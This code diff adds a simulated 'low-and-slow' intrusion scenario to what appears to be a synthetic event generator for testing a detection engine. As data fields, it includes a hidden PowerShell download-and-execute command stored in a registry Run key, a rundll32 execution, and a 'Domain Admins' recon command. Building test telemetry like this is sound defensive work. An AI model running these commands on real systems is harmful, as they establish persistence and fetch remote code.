@@ -217,6 +217,50 @@ def scenario_exfiltration(ent: Enterprise, rng: random.Random, start: datetime, 
                           ["collection", "exfiltration"], "high", ["exfiltration", "insider"])
 
 
+# ---------------------------------------------------------------------------- Scenario I: low-and-slow (evasion)
+def scenario_low_and_slow(ent: Enterprise, rng: random.Random, start: datetime, tenant: str = "default") -> ScenarioResult:
+    """A patient, living-off-the-land intrusion spread over ~5 days.
+
+    Every step is individually sub-threshold — a single medium-severity signal, never two in the same
+    hour — so a window-based correlator never forms an incident. Only entity-anchored risk that
+    accumulates across days (the Risk Ledger) can surface it. This is the scenario built to answer
+    "how does the attack graph hold when the adversary is deliberately trying not to look like a chain?"
+    """
+    victim = ent.random_user(rng, admin=False, dev=False)
+    h = victim.host
+    ip = rng.choice(MALICIOUS_IPS)
+    dom = rng.choice(["cdn.metrics-collect.io", "sync.telemetry-cdn.net"])
+    day = timedelta(days=1)
+    t0 = start.replace(hour=rng.randint(9, 16), minute=rng.randint(0, 59))
+    evs = [
+        # day 0: a registry run-key (persistence) — medium, alone below the incident floor
+        _e(ent, t0, victim.name, h, tenant, source=SourceType.WINDOWS, event_type=EventType.REGISTRY_CHANGE,
+           action="set_value", file_path=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
+           command_line=r"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x')"),
+        # day 1: a single dyn-DNS lookup
+        _e(ent, t0 + day, victim.name, h, tenant, source=SourceType.DNS, event_type=EventType.DNS_QUERY,
+           action="query", outcome="success", domain="update.duckdns.org", dst_ip=ip),
+        # day 2: one rare LOLBin exec from a temp path
+        _e(ent, t0 + 2 * day, victim.name, h, tenant, event_type=EventType.PROCESS_START, action="start",
+           process_name="rundll32.exe", parent_process_name="explorer.exe",
+           file_path=r"C:\Users\{u}\AppData\Local\Temp\rundll32.exe".replace("{u}", victim.name),
+           command_line=r"rundll32.exe C:\Users\Public\a.dll,Start"),
+        # day 3: a single small beacon to a known-bad IP
+        _e(ent, t0 + 3 * day, victim.name, h, tenant, source=SourceType.NETWORK, event_type=EventType.NETWORK_CONNECTION,
+           action="connect", process_name="rundll32.exe", dst_ip=ip, dst_port=443, bytes_out=1400, domain=dom),
+        # day 4: one off-hours domain-recon command
+        _e(ent, t0 + 4 * day + timedelta(hours=2), victim.name, h, tenant, event_type=EventType.PROCESS_START,
+           action="start", process_name="net.exe", parent_process_name="cmd.exe",
+           file_path=r"C:\Windows\System32\net.exe", command_line='net group "Domain Admins" /domain'),
+        # day 5: a modest staged archive
+        _e(ent, t0 + 5 * day, victim.name, h, tenant, event_type=EventType.FILE_CREATE, action="create",
+           process_name="rundll32.exe", file_path=f"C:\\Users\\{victim.name}\\AppData\\Local\\Temp\\d.zip", file_size=28_000_000),
+    ]
+    return ScenarioResult("I", "Low-and-slow campaign", "Weak signals spread over ~5 days on one host that never cluster into a chain",
+                          evs, victim.name, h, ["T1547.001", "T1071.004", "T1218.011", "T1071.001", "T1087.002", "T1560.001"],
+                          ["persistence", "command_and_control", "discovery", "collection"], "high", ["slow_burn", "evasion"])
+
+
 SCENARIOS = {
     "A": scenario_brute_force,
     "B": scenario_suspicious_login,
@@ -226,6 +270,7 @@ SCENARIOS = {
     "F": scenario_ransomware,
     "G": scenario_dns_tunnel,
     "H": scenario_exfiltration,
+    "I": scenario_low_and_slow,
 }
 
 
